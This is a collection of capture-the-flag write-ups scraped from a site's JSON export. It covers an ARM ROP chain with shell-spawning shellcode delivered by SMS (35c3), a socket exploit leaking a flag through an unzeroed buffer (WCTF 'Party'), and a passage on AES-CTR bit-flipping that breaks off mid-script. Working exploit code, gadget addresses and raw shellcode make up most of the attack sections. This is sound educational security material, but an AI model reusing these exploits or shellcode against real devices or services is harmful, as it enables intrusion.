{r5, pc} r5pop = 0x000128fe #0x000118c6 : pop {r4, pc} r4pop = 0x000118c6 #0x000172a6 : pop {r2, r3, r4, pc} r234pop = 0x000172a6 #0x00016c12 : pop {r1, r4, pc} r14pop = 0x00016c12 #0x00015c24 : pop {r0, r3, pc} r03pop = 0x00015c24 #0x00012b4e : pop {r2, pc} r2pop = 0x00012b4e #0x000111c4 : pop {r3, pc} not thumb r3popnothumb = 0x000111c4 #0x00011f52 : blx r4 blxr4 = 0x00011f52 # void *mmap(void *addr, size_t len, int prot, int flags, int fildes, off_t off); mmap = 0x00011240 mmap = 0x00013E0C +1 memcpy = 0x00011410 memcpy_got = 0x000320C0 #0x0001fe36 : add r3, sp, #0x2b8 addr3sp = 0x0001fe36 #0x000176c0 : add r0, sp, #0x1a0 ; movs r1, r0 ; bx lr #0x000122c0 : ldm.w ip, {r5, sb, sl, lr} ; add sp, #0x10 ; pop {r4, pc} ctrlr = 0x000122c0 #0x00014b5a : ldr lr, [sp], #4 ; b.w #0x1263e setlrjmpr3 = 0x00014b5a \u0026#34;\u0026#34;\u0026#34; Register state when we take control of PC r0 0x0 0 r1 0x38024 229412 r2 0x35a70 219760 r3 0x35a70 219760 r4 0x61716161 1634820449 r5 0x61726161 1634885985 r6 0x61736161 1634951521 r7 0x61746161 1635017057 r8 0x61756161 1635082593 r9 0x61766161 1635148129 r10 0x61776161 1635213665 r11 0x61786161 1635279201 r12 0x7 7 sp 0x7efe9b38 0x7efe9b38 lr 0x3f 63 pc 0x5a5a5a5a 0x5a5a5a5a cpsr 0x600b0110 1611333904 fpscr 0x10 16 \u0026#34;\u0026#34;\u0026#34; address = 0x177000 stderr = 0x00036E90 ropchain = c[:74] + p32(stderr) + p32(address) * 4 ropchain = ropchain.ljust(94, \u0026#34;A\u0026#34;) ropchain += p32(r3popnothumb) ropchain += p32(address) #r3 dont care ropchain += p32(r5pop+1) ropchain += p32(address) #r5 dont care ropchain += p32(r14pop+1) ropchain += p32(0x1000) #r1 size ropchain += p32(address) #r4 dont care ropchain += p32(r234pop+1) #pc ropchain += p32(7) #r2 prot ropchain += p32(address) #r3 dont care ropchain += p32(address) #r4 dont care ropchain += p32(r03pop+1) #pc ropchain += p32(address) #r0 addr ropchain += p32(0x22) #r3 flags Anonimous ropchain += p32(mmap) ropchain += p32(0x0) #fildes ropchain += p32(0x0) #off ropchain += p32(0x41414141) #pc Gaining back PC Control # The main problem was that mmap assumed to be called with a BLX, ergo it will return to the value inside the lr register. For whatever reason that I do not know lr register was set to 0x3f so a direct jump to mmap would cause a crash at the end. Instead of jumping directly to mmap then, we can use a call of mmap that is already in the program somewhere. This, after the execution of the mmap, would continue the execution in that part of the program. Then we just need to have the program not crashing before reaching another return that do not use link register. I jumped to 0x00013E0C +1.\n.text:00013E04 200 MOV.W R2, #3 ; prot .text:00013E08 200 ADD R1, R5 ; len .text:00013E0A 200 STR R5, [R4,#0x58] ; Store to Memory .text:00013E0C 200 BLX mmap ; Branch with Link and Exchange (immediate address) .text:00013E10 200 ADDS R3, R0, #1 ; Rd = Op1 + Op2 .text:00013E12 200 STR R0, [R4,#0x5C] ; Store to Memory .text:00013E14 200 BEQ.W loc_140F0 ; Bran To ensure that the execution would continue without crashing, I tried to set most registers to address. In this way, instructions differentiating those registers would not end up crashing. This actually (and surprisingly) worked. I manually executed my payload with gdb until the program was popping another value from the stack to the PC register. I save the address did some math to understand how far it was from the vulnerable buffer. With an sms in position 8 we can gain back control of PC register.\nSecond Payload # At this point, we have a page in the memory space with a fixed address where we can write and jump into.\nWe need some reliable way to copy a shellcode into this memory and jump to it. I tried for several hours to build a call to memcpy but I was not able to put a stack address into r1 register. (r1 is the source register because of the calling convention of amr32).\nThankfully marcof came out with the idea of building a ropchain that write the shellcode into memory using registers.\nThis is the type of gadget that you need:\n# 0x00013568 : str r4, [r3] ; mov r0, r1 ; pop {r4, pc} storer4r3 = 0x00013568 You put 4 bytes that you want to write in r4 and the address where to write in r3 and keep doing that until the whole shellcode is written.\nThe challenge here was to have a chain not too long, because we were close to env variable on the stack, overwriting env was ending in a crash because used by some time function.\nAfter several iterations we end up with this script to generate such chain:\nropchain_second += p32(r4pop+1) #r4 ropchain_second += shellcode[0:4] #r4 for x in range(0, len(shellcode), 4): spiece_next = shellcode[x+4:x+8] if x \u0026gt;= len(shellcode)-4: spiece_next = p32(address+1) # These put jumping address in r4 print \u0026#34;done\u0026#34; ropchain_second += p32(popr3+1) #pc ropchain_second += p32(address+x) #r3 value ropchain_second += p32(storer4r3+1) #pc ropchain_second += spiece_next #r4 #add jump to address ropchain_second += p32(blxr4+1) The other point to keep the chain short was keeping the payload short. We basically used this shellcode with small fixes:\nwe removed instruction that jumps in thumb mode (we can do this directly) we changed \u0026ldquo;/system/bin/sh\u0026rdquo; in \u0026ldquo;/bin/sh\u0026rdquo; we reduce bytes for the port. This is the final script that produces 5 SMSes. The last one is the one which triggers the bug so it needs to be the last one.\nfrom pwn import * def encode_part(ref_num, data, CSMS=0x17, max_part=3): assert max_part \u0026lt;= 3 header = \u0026#34;\\x05\\x00\\x03\u0026#34; + chr(CSMS) + chr(max_part) + chr(ref_num) return header+data c = \u0026#34;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa\u0026#34; #r3 load # 0x0001275e : ldr r3, [r5, #0x20] ; cmp r3, r4 ; bne #0x12760 ; ldrd r4, r5, [sp] ; add sp, #8 ; pop {r6, pc} r3load = 0x0001275e #0x000128fe : pop {r5, pc} r5pop = 0x000128fe #0x000118c6 : pop {r4, pc} r4pop = 0x000118c6 #0x000172a6 : pop {r2, r3, r4, pc} r234pop = 0x000172a6 #0x00016c12 : pop {r1, r4, pc} r14pop = 0x00016c12 #0x00015c24 : pop {r0, r3, pc} r03pop = 0x00015c24 #0x00012b4e : pop {r2, pc} r2pop = 0x00012b4e #0x000111c4 : pop {r3, pc} not thumb r3popnothumb = 0x000111c4 #0x00011f52 : blx r4 blxr4 = 0x00011f52 # void *mmap(void *addr, size_t len, int prot, int flags, int fildes, off_t off); mmap = 0x00011240 mmap = 0x00013E0C +1 memcpy = 0x00011410 memcpy_got = 0x000320C0 #0x0001fe36 : add r3, sp, #0x2b8 addr3sp = 0x0001fe36 #0x000176c0 : add r0, sp, #0x1a0 ; movs r1, r0 ; bx lr #0x000122c0 : ldm.w ip, {r5, sb, sl, lr} ; add sp, #0x10 ; pop {r4, pc} ctrlr = 0x000122c0 #0x00014b5a : ldr lr, [sp], #4 ; b.w #0x1263e setlrjmpr3 = 0x00014b5a \u0026#34;\u0026#34;\u0026#34; Register state when we take control of PC r0 0x0 0 r1 0x38024 229412 r2 0x35a70 219760 r3 0x35a70 219760 r4 0x61716161 1634820449 r5 0x61726161 1634885985 r6 0x61736161 1634951521 r7 0x61746161 1635017057 r8 0x61756161 1635082593 r9 0x61766161 1635148129 r10 0x61776161 1635213665 r11 0x61786161 1635279201 r12 0x7 7 sp 0x7efe9b38 0x7efe9b38 lr 0x3f 63 pc 0x5a5a5a5a 0x5a5a5a5a cpsr 0x600b0110 1611333904 fpscr 0x10 16 \u0026#34;\u0026#34;\u0026#34; address = 0x177000 stderr = 0x00036E90 ropchain = c[:74] + p32(stderr) + p32(address) * 4 ropchain = ropchain.ljust(94, \u0026#34;A\u0026#34;) ropchain += p32(r3popnothumb) ropchain += p32(address) #r3 dont care ropchain += p32(r5pop+1) ropchain += p32(address) #r5 dont care ropchain += p32(r14pop+1) ropchain += p32(0x1000) #r1 size ropchain += p32(address) #r4 dont care ropchain += p32(r234pop+1) #pc ropchain += p32(7) #r2 prot ropchain += p32(address) #r3 dont care ropchain += p32(address) #r4 dont care ropchain += p32(r03pop+1) #pc ropchain += p32(address) #r0 addr ropchain += p32(0x22) #r3 flags Anonimous ropchain += p32(mmap) ropchain += p32(0x0) #fildes ropchain += p32(0x0) #off ropchain += p32(0x41414141) #pc \u0026#34;\u0026#34;\u0026#34; r0 0xffffffff 4294967295 r1 0x9 9 r2 0x76f9c6a0 1996080800 r3 0xffffffff 4294967295 r4 0x41414141 1094795585 r5 0x41414141 1094795585 r6 0x41414141 1094795585 r7 0x41414141 1094795585 r8 0x41414141 1094795585 r9 0x177000 1536000 r10 0x177000 1536000 r11 0x177000 1536000 r12 0x6 6 sp 0x7ed1fd70 0x7ed1fd70 lr 0x76dde329 1994253097 pc 0x5a5a5a5a 0x5a5a5a5a cpsr 0x200f0110 537854224 fpscr 0x10 16 \u0026#34;\u0026#34;\u0026#34; #0x000118c4 : strb r3, [r4] ; pop {r4, pc} storer3r4 = 0x000118c4 #0x00013ad2 : str r2, [r3] ; pop {r4, pc} storer2r3 = 0x00013ad2 # 0x00013568 : str r4, [r3] ; mov r0, r1 ; pop {r4, pc} storer4r3 = 0x00013568 ropchain_second = \u0026#34;A\u0026#34;*126 # 0x00012a6a : pop {r3, pc} popr3 = 0x00012a6a shellcode = \u0026#34;\\x02\\x20\\x01\\x21\\x92\\x1A\\x0F\\x02\\x19\\x37\\x01\\xDF\\x06\\x1C\\x08\\xA1\\x10\\x22\\x02\\x37\\x01\\xDF\\x3F\\x27\\x02\\x21\\x30\\x1c\\x01\\xdf\\x01\\x39\\xFB\\xD5\\x05\\xA0\\x92\\x1a\\x05\\xb4\\x69\\x46\\x0b\\x27\\x01\\xDF\\xC0\\x46\\x02\\x00\\x12\\x34\\x25\\x3b\\x24\\x28\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\u0026#34; print len(shellcode) ropchain_second += p32(r4pop+1) #r4 ropchain_second += shellcode[0:4] #r4 for x in range(0, len(shellcode), 4): spiece_next = shellcode[x+4:x+8] if x \u0026gt;= len(shellcode)-4: spiece_next = p32(address+1) # These put jumping address in r4 print \u0026#34;done\u0026#34; ropchain_second += p32(popr3+1) #pc ropchain_second += p32(address+x) #r3 value ropchain_second += p32(storer4r3+1) #pc ropchain_second += spiece_next #r4 #add jump to address ropchain_second += p32(blxr4+1) ropchain1 = ropchain[:134] ropchain2 = ropchain[134:] ropchain_second1 = ropchain_second[:134] ropchain_second2 = ropchain_second[134:134*2] ropchain_second3 = ropchain_second[134*2:134*3] # ropchain_second4 = ropchain_second[134*3:] print len(ropchain_second4) print \u0026#34;smshex one 1 9999\u0026#34;, encode_part(5+5, ropchain_second3, max_part=1, CSMS=23).encode(\u0026#34;hex\u0026#34;) print \u0026#34;smshex one 1 9999\u0026#34;, encode_part(5+6, ropchain_second4, max_part=1, CSMS=24).encode(\u0026#34;hex\u0026#34;) # print \u0026#34;smshex one 1 9999\u0026#34;, encode_part(5+4, ropchain_second2, max_part=1, CSMS=21).encode(\u0026#34;hex\u0026#34;) print \u0026#34;smshex one 1 9999\u0026#34;, encode_part(5+3, ropchain_second1, max_part=3).encode(\u0026#34;hex\u0026#34;) print \u0026#34;smshex one 1 9999\u0026#34;, encode_part(5, ropchain2, max_part=3).encode(\u0026#34;hex\u0026#34;) print \u0026#34;smshex one 1 9999\u0026#34;,encode_part(4, ropchain1, max_part=3).encode(\u0026#34;hex\u0026#34;) #35C3_n0k1a_pH0ne_i5_b3st_ph0n3 ","date":"30 December 2018","externalUrl":null,"permalink":"/writeups/2018-12-30-35c3ctf-newphonewhodis/","section":"","summary":"","title":"newphonewhodis - 35c3ctf","type":"writeups"},{"content":"","date":"30 December 2018","externalUrl":null,"permalink":"/tags/nokia/","section":"Tags","summary":"","title":"Nokia","type":"tags"},{"content":"","date":"30 December 2018","externalUrl":null,"permalink":"/tags/pwn/","section":"Tags","summary":"","title":"Pwn","type":"tags"},{"content":"","date":"30 December 2018","externalUrl":null,"permalink":"/tags/sms/","section":"Tags","summary":"","title":"Sms","type":"tags"},{"content":"","date":"8 July 2018","externalUrl":null,"permalink":"/tags/.net/","section":"Tags","summary":"","title":".Net","type":"tags"},{"content":" Authors: pietroferretti Give them an inch and they\u0026rsquo;ll take a mile\nFirst look # The challenge is a small .NET PE binary.\nRunning the executable we can see that it can be run:\nas a server, which holds a secret flag; as a client, which sends messages to the server via socket and shows the replies in a dialog. The server interface:\nThe client interface:\nThe user interface lets you define a list of \u0026ldquo;party guests\u0026rdquo;, a list of \u0026ldquo;friendships\u0026rdquo; between them, and some \u0026ldquo;Erdos Scrutiny\u0026rdquo; parameter. By clicking on \u0026ldquo;Evaluate Party\u0026rdquo; the parameters are sent to the server and evaluated according to some unknown criteria. The server replies saying if Paul Erdos either approves or disapproves of the party.\nSince there isn\u0026rsquo;t any obvious way to interact with the flag from the client, we\u0026rsquo;d better look at the insides of the program.\nReversing the binary # We decompiled the binary to better understand how the client communicates with the server.\nHere is the decompiled source: ClientThread.cs.\nWe found out that there are actually three different type of messages which the server accepts, depending on the first number sent to the socket:\n1: a simple echo service 2: the \u0026ldquo;Erdos party approval\u0026rdquo; check that is actually used by the user interface 3: a flag check service The flag check service # This service takes a number of strings, one per line, and for each checks if the string is equal to the flag. The service then replies with \u0026ldquo;Correct\u0026rdquo; or \u0026ldquo;Incorrect\u0026rdquo; for each of the strings supplied.\nAs it is, this service is not very useful for us. Since the check is made on the whole flag, the only way we have to find the flag would be to fully bruteforce it, which is unfeasible.\nLooking at the code though we can see that this is the only section of code where the flag is used. We are therefore forced to find some way to make use of it, or somehow leak the information elsewhere.\nAfter looking at the code some more, we noticed that the comm buffer is used by both the flag check service and the erdos approval service. There might exist some way for some information related to the flag to leak from the other service, as long as:\nthe comm buffer is modified in a way that depends on the flag, the buffer is not cleared out when the approval service is used, the output of the approval service depends on the portion of content of comm that was modified by the flag check service. The flag check is computed with the following code:\nint res = string.Compare(this.flag, strB, StringComparison.Ordinal); // res is then saved into comm We can see that the result of string.Compare (a 4-byte integer) is stored in comm, and therefore the first condition is satisfied.\nNote: the result of the call is positive or negative depending on which of the two arguments would come first in the lexicographic order. This means that if we manage to leak the content of comm, we could setup a binary search using the result of the Compare as a discriminator, and find the flag byte by byte.\nThe Erdos approval service # Long story short, this service does the following:\nGiven n a number of nodes, l edges, s threshold, build an undirected graph with n nodes and the l edges provided, check if there are no fully connected subgraphs with more than or equal to s nodes there are no fully disconnected subgraphs with more than or equal to s nodes In this section of the program comm is used to store the edges of the graph, represented as single bits: 1 if the edge exists, 0 if it doesn\u0026rsquo;t.\nThe following lines of codes are the ones supposed to zero out all the bytes needed to store the edges.\nint maxedgesbytes = (nodes * nodes - nodes) / 2 / 8; for (int index = 0; index \u0026lt; maxedgesbytes; ++index) this.comm[2 + index] = (byte) 0; The code makes sense (each node can have an edge with nodes - 1 other nodes, the total number is divided by 2 since the graph is undirected), but it\u0026rsquo;s actually flawed: the division by 8 truncates the result, and prevents the last needed byte from being zeroed out.\nThis means any previous usage of comm can affect the representation of the graph edges, or, in other words, the content of comm can \u0026ldquo;add edges\u0026rdquo; to the graph. For instance if some bits in that last byte were left to 1 from previous usages, the code would believe that the edges corresponding to those bits exist in the graph.\nThe immediate consequence is that the result of the erdos approval computation can also change depending from previous usages of comm.\nThis takes care of the second and third conditions we laid out previously, and prove that an attack is possible.\nWe now need to find some reliable way to guess the content of that leftover byte using the erdos approval check.\nThe attack # We\u0026rsquo;re interested in the sign of the string.Compare result, i.e. if the integer was positive or negative.\nThe integer is stored in comm as 4 bytes, in little-endian order, and, being signed, it probably uses the two\u0026rsquo;s complement representation.\nWith some tests we noticed that the absolute value of the result of string.Compare doesn\u0026rsquo;t go over 2 bytes. This mean that, using two\u0026rsquo;s complement:\nif the result is positive, the most significant byte is all zeros if the result is negative, the most significant byte is all ones Since the integer is saved in litte-endian order, the most significant byte is the 4th.\nThe 4th byte can only assume two different values, and the erdos approval too: with the correct setup, there might be a way to reliably recover the sign of the result from a single erdos approval check.\nLooking back at the comm zeroing out snippet:\nint maxedgesbytes = (nodes * nodes - nodes) / 2 / 8; for (int index = 0; index \u0026lt; maxedgesbytes; ++index) this.comm[2 + index] = (byte) 0; We want maxedgesbytes to reach the 4th byte, but not overwrite it. To achieve this we want to choose the number of nodes such that: ((nodes * nodes - nodes) / 2 / 8) % 4 == 3 - 2\n(NB: - 2 because comm is zeroed out starting from 2, but the compare results are stored starting from 0)\nOne of the values that fulfill this condition is 6 (among many others).\nIn the case of 6, the number of possible edges is (6*6 - 6) / 2 = 15. The number of zeroed out bytes is 2 + (15/8) = 3, leaving the 4th byte untouched but still used to represent the graph (we need two bytes to store 15 edges).\nConsider this case:\nn = 6 nodes l = 0 edges threshold s = 6 Depending on the result of the string.Compare call:\nif the result is positive, the 4th byte is all zeros no edges, we have a fully disconnected subgraph of size 6. Not approved. if the result is positive, the 4th byte is all ones some edges exist,there is no fully disconnected or fully connected subgraph of size 6. Approved. We can therefore find the value of the 4th byte and the sign of the comparison with the flag.\nWe have everything we need. We can now setup a binary search by adding a character at a time to our input and checking if the result of the compare is positive or negative.\nThe exploit:\n#!/usr/bin/env python3 from socket import socket import time host = \u0026#39;180.163.241.15\u0026#39; port = 10658 def testflag(flag): sock = socket() sock.connect((host, port)) # overwrite comm sock.send(b\u0026#39;3\\n\u0026#39;) sock.send(b\u0026#39;1\\n\u0026#39;) # one line sock.send(flag.encode() + b\u0026#39;\\n\u0026#39;) res = b\u0026#39;\u0026#39; while not (b\u0026#39;Correct\u0026#39; in res or b\u0026#39;Incorrect\u0026#39; in res): time.sleep(0.1) res += sock.recv(1024) print(res) if b\u0026#39;Correct\u0026#39; in res: return 0 # leak sign bit sock.send(b\u0026#39;2\\n\u0026#39;) sock.send(b\u0026#39;6\\n\u0026#39;) # 6 nodes sock.send(b\u0026#39;6\\n\u0026#39;) # threshold = 6 sock.send(b\u0026#39;0\\n\u0026#39;) # no edges res = b\u0026#39;\u0026#39; while not b\u0026#39;party\u0026#39; in res: time.sleep(0.1) res += sock.recv(1024) print(res) sock.close() if b\u0026#39;does not approve\u0026#39; in res: return 1 # flag is bigger elif b\u0026#39;approves\u0026#39; in res: return -1 # flag is smaller else: raise Exception(\u0026#39;something wrong\u0026#39;) flag = \u0026#39;\u0026#39; newchar = \u0026#39;\u0026#39; for l in range(100): flag += newchar print(l) print(flag) minv = 0x20 maxv = 0x7e while minv != maxv: newchar = chr(minv + (maxv - minv) // 2) newflag = flag + newchar print(minv, maxv) res = testflag(newflag) if res \u0026gt; 0: # character is too small, or the string is too short minv = minv + (maxv - minv + 1) // 2 elif res \u0026lt; 0: # character is too big maxv = minv + (maxv - minv) // 2 else: print(\u0026#39;Flag found!\u0026#39;, newflag) exit() # check off-by-one because of the different string length if testflag(flag + newchar) \u0026lt; 0: newchar = chr(ord(newchar) - 1) ","date":"8 July 2018","externalUrl":null,"permalink":"/writeups/2018-07-08-wctf-2018-party/","section":"","summary":"","title":"Party - WCTF 2018","type":"writeups"},{"content":"","date":"8 July 2018","externalUrl":null,"permalink":"/tags/scripting/","section":"Tags","summary":"","title":"Scripting","type":"tags"},{"content":"","date":"8 July 2018","externalUrl":null,"permalink":"/tags/wctf/","section":"Tags","summary":"","title":"Wctf","type":"tags"},{"content":"","date":"30 June 2018","externalUrl":null,"permalink":"/tags/crypto/","section":"Tags","summary":"","title":"Crypto","type":"tags"},{"content":" Authors: pietroferretti, chqmatteo Secret Cloud Storage System: This is a new system to store your end-to-end encrypted secrets. Now with SHA3 integrity checks! $ nc dogestore.ctfcompetition.com 1337\nAttached we find:\nfragment.rs, some partial Rust source code for the challenge; encrypted_secret, a 110 bytes large binary file. Understanding the challenge # Let\u0026rsquo;s start by taking a look at the Rust source code we were provided.\nconst FLAG_SIZE: usize = 56; const FLAG_DATA_SIZE: usize = FLAG_SIZE * 2; #[derive(Debug, Copy, Clone)] struct Unit { letter: u8, size: u8, } fn deserialize(data: \u0026amp;Vec\u0026lt;u8\u0026gt;) -\u0026gt; Vec\u0026lt;Unit\u0026gt; { let mut secret = Vec::new(); for (letter, size) in data.iter().tuples() { secret.push(Unit { letter: *letter, size: *size, }); } secret } fn decode(data: \u0026amp;Vec\u0026lt;Unit\u0026gt;) -\u0026gt; Vec\u0026lt;u8\u0026gt; { let mut res = Vec::new(); for \u0026amp;Unit { letter, size } in data.iter() { res.extend(vec![letter; size as usize + 1].iter()) } res } fn decrypt(data: \u0026amp;Vec\u0026lt;u8\u0026gt;) -\u0026gt; Vec\u0026lt;u8\u0026gt; { key = get_key(); iv = get_iv(); openssl::symm::decrypt( openssl::symm::Cipher::aes_256_ctr(), \u0026amp;key, Some(\u0026amp;iv), data ).unwrap() } fn store(data: \u0026amp;Vec\u0026lt;u8\u0026gt;) -\u0026gt; String { assert!( data.len() == FLAG_DATA_SIZE, \u0026#34;Wrong data size ({} vs {})\u0026#34;, data.len(), FLAG_DATA_SIZE ); let decrypted = decrypt(data); let secret = deserialize(\u0026amp;decrypted); let expanded = decode(\u0026amp;secret); base64::encode(\u0026amp;compute_sha3(\u0026amp;expanded)[..]) } As suggested by the name (fragment.rs), the source code is partial, but we can nonetheless understand what it\u0026rsquo;s supposed to do.\nstore is the function that calls all the other functions, and works like this:\nread 56*2 = 112 bytes, \u0026ldquo;decrypt\u0026rdquo; the data, \u0026ldquo;deserialize\u0026rdquo; the data, \u0026ldquo;decode\u0026rdquo; the data, return the SHA-3 hash of the result, encoded in base64. We try to interact with the service at dogestore.ctfcompetition.com to check if it works in a similar way.\nThe service reads exactly 110 bytes, and returns a base64-encoded string, which decodes to 32 bytes.\nThe service\u0026rsquo;s behaviour seems to match the source code, except for reading 110 bytes instead of 112. Close enough to be FLAG_SIZE*2, but we guess the organizers messed something up and FLAG_SIZE is actually 55. Among the SHA-3 variants, 32 bytes means SHA-3-256 is probably the one used by the service.\nThe challenge emulates a service taking some encrypted, serialized data, restoring it back to original, and returning a checksum.\nLet\u0026rsquo;s dive more deeply in each function.\nDecryption # This function decrypts the 110 bytes using AES-CTR (AES counter mode). We assume the IV and the key are fixed, since we can\u0026rsquo;t supply them and the service is supposed to be deterministic.\nDeserialization # This function parses and deserializes the decrypted data.\ntuples() is not defined, but we assume (looking at the Unit struct) that it iterates through the byte vector 2 bytes at a time. For each pair, the first byte is read as a \u0026ldquo;letter\u0026rdquo;, the second as a \u0026ldquo;size\u0026rdquo;.\nDecoding # The deserialized data is then \u0026ldquo;expanded\u0026rdquo; back to original size like this: for each letter-size pair, repeat the letter size+1 times.\nLet\u0026rsquo;s see an example:\ninput: \u0026#39;A \\x00 B \\x04 C \\x01\u0026#39; (these are contiguous bytes) A repeated 0+1=1 times B repeated 4+1=5 times C repeated 1+1=2 times output: \u0026#39;ABBBBBCC\u0026#39; We now know the format of the decrypted data: the data is like\n1 byte: letter 1 byte: size - 1 ... repeated 55 times total length = 55*2 = 110 bytes Example: \u0026#39;A\\x00B\\x04C\\x01w\\x00t\\x02...\u0026#39; Since usually serialization tries to save as much space as possible, we expect each letter to be different from the previous one.\nApproach # encrypted_secret is 110 bytes long, same size as the service input. Looking at the filename, this is probably the serialized, encrypted flag.\nLet\u0026rsquo;s start by submitting the secret to the service. The service sends back the SHA-3 hash of the decrypted secret:\nff1e690dea4fa3384cfb151e95abe92fde33e57d69d8c1f97107d0bbccf8a1d6\nWe can\u0026rsquo;t do much with this, but it could be useful for some additional final checks.\nTo move to the actual attack, some crypto basics are needed. Skip the next section if this stuff is old news for you.\nCrypto Background # SHA-3 # SHA-3 is a cryptographic hashing function, i.e. a function that maps a message of arbitrary length to a fixed-size digest.\nOne of the main properties of a cryptographic hash function is that it is non-invertible: we can\u0026rsquo;t recover the original message from a digest. We\u0026rsquo;ll have to find another way to find the secret.\nAES-CTR # AES is a block cipher, but it can work in many different modes of operation.\nAES-CTR specifically is a mode of operation which makes AES work like a stream cipher. Instead of encrypting a message block by block, we generate a continuous, unpredictable bitstream. The bitstream (also called keystream) is simply XOR-ed with the plaintext to generate the ciphertext.\nThe keystream depends on both the IV (initialization vector, or nonce) and the key. In this challenge we assume the IV and the key are fixed, since we can\u0026rsquo;t provide them and we expect the service to be deterministic.\nThis means that in this specific case the keystream is fixed, and AES-CTR is reduced to a simple XOR cipher.\nLet\u0026rsquo;s see an example. Consider as plaintext the string \u0026ldquo;Wiki\u0026rdquo; (01010111 01101001 01101011 01101001 in 8-bit ASCII).\nEncryption with a XOR cipher and a sample keystream:\n01010111 01101001 01101011 01101001 // plaintext ‚äï 11110011 01100011 11101001 00110010 // keystream = 10100100 00001010 10000010 01011011 // ciphertext Decryption is done by XOR-ing the ciphertext with the keystream again:\n10100100 00001010 10000010 01011011 // ciphertext ‚äï 11110011 01100011 11101001 00110010 // keystream = 01010111 01101001 01101011 01101001 // plaintext Attacks on AES-CTR # Without integrity checks, AES-CTR is malleable. By manipulating the ciphertext, we can purposefully modify the plaintext it will be decrypted to, even if we don\u0026rsquo;t know the plaintext itself.\nThis is because, since aes-ctr is equivalent to a simple XOR cipher, when we flip a bit in the ciphertext the bit will be flipped in the plaintext too!\nLet\u0026rsquo;s see an example. We take the same ciphertext as the previous example, and flip an arbitrary bit.\n10100100 00001010 10000010 01011011 -\u0026gt; 10100100 00001010 1000001*1* 01011011\n10100100 00001010 10000011 01011011 // modified ciphertext ‚äï 11110011 01100011 11101001 00110010 // keystream = 01010111 01101001 01101010 01101001 // new plaintext The plaintext bit in the same position was flipped.\n01010111 01101001 01101011 01101001 -\u0026gt; 01010111 01101001 0110101*0* 01101001\nDecrypted plaintext: \u0026ldquo;Wiji\u0026rdquo; instead of \u0026ldquo;Wiki\u0026rdquo;.\nSince we know the format of the encrypted data, we can use this trick to our advantage to edit the plaintext in critical positions.\nFinding the letters # Let\u0026rsquo;s think about it. The only output the service is willing to give us is the hash of the decoded plaintext. We can\u0026rsquo;t do much with it, except for checking if the hash is one we already know. We need to use this hash to guess the content of the plaintext.\nWe can use the fact that two different serializations can be decoded to the same message: if the same letter appears twice in a row in the serialized data, as long as the sum of the sizes of the two repeated letters is the same, the decoded message will also be the same (and the hash will be too).\nExample:\n\u0026#39;A\\x02A\\x02\u0026#39; is decoded as \u0026#39;AAAAAA\u0026#39; \u0026#39;A\\x01A\\x03\u0026#39; is also decoded as \u0026#39;AAAAAA\u0026#39; We will use this and some clever xor tricks to run automated tests on the plaintext values, and leak the content.\nThe attack:\nconsider a pair of adjacent \u0026ldquo;letters\u0026rdquo; (i.e. letter 1 + size 1 + letter 2 + size 2) XOR the second letter with the mask M XOR the least significant bit of the size bytes in all the possible configurations (0 and 0, 0 and 1, 1 and 0, 1 and 1) if the letter are XORed to be the same, two of the four combinations will produce a message where the letter is repeated for the same total number of times, and therefore two hashes will match if the letters are not XORed to be the same, no match will be found try XOR-ing with a different value M until a match is found (up to 256) repeat for each pair of adjacent letters (from 1 to 55) When a match is found, we will have leaked the value M = letter 1 XOR letter 2.\nExample:\noriginal plaintext: A\\x03D\\x05 if the letter is xor-ed correctly, the second letter will be the same as the first in the new plaintext: ... xor 2 -\u0026gt; A\\x03C\\x05 xor first size, xor second size -\u0026gt; result 0,0 -\u0026gt; A\\x03C\\x05 tot 10, decoded as AAAACCCCCC 0,1 -\u0026gt; A\\x03C\\x04 tot 9, decoded as AAAACCCCC 1,0 -\u0026gt; A\\x02C\\x05 tot 9, decoded as AAACCCCCC 1,1 -\u0026gt; A\\x02C\\x04 tot 8, decoded as AAACCCCC *no match* xor 3 -\u0026gt; A\\x03A\\x05 xor first size, xor second size -\u0026gt; result 0,0 -\u0026gt; A\\x03A\\x05 tot 10, decoded as AAAAAAAAAA 0,1 -\u0026gt; A\\x03A\\x04 tot 9, decoded as AAAAAAAAA *match* 1,0 -\u0026gt; A\\x02A\\x05 tot 9, decoded as AAAAAAAAA *match* 1,1 -\u0026gt; A\\x02A\\x04 tot 8, decoded as AAAAAAAA We can prove that, if the next letter is xor-ed to be the same as the current, at least two of the four hashes will be the same. There is always a combination that makes the size increase or decrease by the same amount. Size variation for each xor bit combination:\n0,0 0,1 1,0 1,1 0,0 +0 +1 +1 +2 0,1 +0 -1 +1 +0 1,0 +0 +1 -1 +0 1,1 +0 -1 -1 -2 On the y axis, we have the lsb of the size bytes for the first and second letter. On the x axis, the possible xor combinations.\nUsing this attack we can find all the bitwise differences between adjacent letters. Since we don\u0026rsquo;t know the value of the first letter, we will have to try all of them and guess which is the one that makes more sense. All the other letters can be found using the first value and the differences.\nThe exploit:\n#!/usr/bin/env python3 from socket import socket from hashlib import sha3_256 as sha3 def bxor(b1, b2): parts = [] for b1, b2 in zip(b1, b2): parts.append(bytes([b1 ^ b2])) return b\u0026#39;\u0026#39;.join(parts) def gethash(text): # send text sock = socket() sock.connect((host, port)) sock.send(text) # get base64 encoded hash data = sock.recv(1024) sock.close() return data host = \u0026#39;dogestore.ctfcompetition.com\u0026#39; port = 1337 # load encrypted flag with open(\u0026#39;encrypted_secret\u0026#39;, \u0026#39;rb\u0026#39;) as f: ctext = f.read() print(\u0026#39;Encrypted:\u0026#39;) print(ctext.hex()) print(len(ctext), \u0026#39;bytes\u0026#39;) nletters = len(ctext) // 2 differences = [] for i in range(0, nletters - 1): print(\u0026#39;index:\u0026#39;, i) for c in range(256): print(\u0026#39;diff:\u0026#39;, c) hashes = [] for x, y in ((0, 0), (0, 1), (1, 0), (1, 1)): # a) xor next letter to make it the same as the current one # b) xor least significant bit of the sizes to create two messages # with varying sizes for the current and following letter, # but same total size mask = b\u0026#39;\\x00\\x00\u0026#39; * i + \\ b\u0026#39;\\x00\u0026#39; + (x).to_bytes(1, \u0026#39;little\u0026#39;) + \\ (c).to_bytes(1, \u0026#39;little\u0026#39;) + (y).to_bytes(1, \u0026#39;little\u0026#39;) + \\ b\u0026#39;\\x00\\x00\u0026#39; * (nletters - i - 2) assert len(mask) == len(ctext) h = 